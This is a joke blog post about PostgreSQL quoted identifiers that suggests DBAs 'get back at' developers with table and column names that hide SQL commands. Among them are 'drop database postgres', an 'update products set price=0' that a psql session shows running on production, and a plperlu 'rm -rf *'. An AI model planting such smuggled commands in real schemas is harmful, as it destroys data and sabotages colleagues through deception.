---
author: Josh Williams
gh_issue_number: 1295
tags: database, postgres
title: 'DBA Revenge: How To Get Back at Developers'
---

In the spirit of April 1st, resurrecting this old classic post:

-----------

Maybe you work at one of those large corporations that has a dedicated DBA staff, separate from the development team.  Or maybe you're lucky and just get to read about it on [thedailywtf.com](http://thedailywtf.com).  But you've probably seen battles between database folk and the developers that "just want a table with "ID " VARCHAR(255), name VARCHAR(255), price VARCHAR(255), post_date VARCHAR(255).  Is that so much to ask?!"

Well if you ever feel the need to get back at them, here's a few things you can try.  Quoted identifiers let you name your objects anything you want, even if they don't look like a normal object name...

```sql
CREATE TABLE "; rollback; drop database postgres;--" ("'';
delete from table order_detail;commit;" INT PRIMARY KEY,
";commit;do $$`rm -rf *`$$ language plperlu;" TEXT NOT NULL);

COMMENT ON TABLE "; rollback; drop database postgres;--"
IS 'DON''T FORGET TO QUOTE THESE';
```

Good advice, that comment.  Of course, assuming they learn, they'll be quoting everything you give them.  So, drop a quote right in the middle of it:

```sql
CREATE TABLE "messages"";rollback;update products set price=0;commit;--"
("am i doing this right" text);

[local]:5432|production=# \dt *messages*
 List of relations
 Schema |                           Name                           | Type  |   Owner
--------+----------------------------------------------------------+-------+-----------
 public | messages";rollback;update products set price=0;commit;-- | table | jwilliams
(1 row)
```
A copy &amp; paste later...

```
[local]:5432|production=# SELECT "am i doing this right" FROM "messages";rollback;update products set price=0;commit;--";
ERROR:  relation "messages" does not exist
LINE 1: select "am i doing this right" from "messages";
                                            ^
NOTICE:  there is no transaction in progress
ROLLBACK
UPDATE 100
WARNING:  there is no transaction in progress
COMMIT
```

Then again, if this is your database, that'll eventually cause you a lot of headache.  Restores aren't fun.  But UTF-8 can be...

```sql
CREATE TABLE suoıʇɔɐsuɐɹʇ (ɯnu‾ɹǝpɹo SERIAL PRIMARY KEY,
ǝɯɐuɹǝsn text REFERENCES sɹǝsn, ןɐʇoʇ‾ɹǝpɹo NUMERIC(5,2));

CREATE TABLE 𝓸𝓻𝓭𝓮𝓻_𝓲𝓽𝓮𝓶𝓼 (𝔬𝔯𝔡𝔢𝔯_𝔦𝔱𝔢𝔪_𝔦𝔡 SERIAL PRIMARY KEY, ... );
```
